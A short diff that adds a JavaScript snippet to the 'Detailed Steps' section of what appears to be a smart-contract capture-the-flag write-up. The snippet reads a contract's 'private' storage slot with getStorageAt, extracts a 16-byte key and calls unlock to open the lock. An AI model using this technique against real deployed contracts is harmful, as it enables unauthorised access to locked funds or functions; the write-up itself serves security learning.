@@ -32,3 +32,9 @@
 
 ## Detailed Steps
 
+```js
+data_2 = await web3.eth.getStorageAt(contract.address, 5) // get data[2] by accessing the slot
+key = data_2.slice(0, 34) // retrieve the first 16 bytes (0x prefix + first 16 bytes, so the ending index is 34)
+await contract.unlock(key)
+await contract.locked() === false // check if the lock is open now
+```
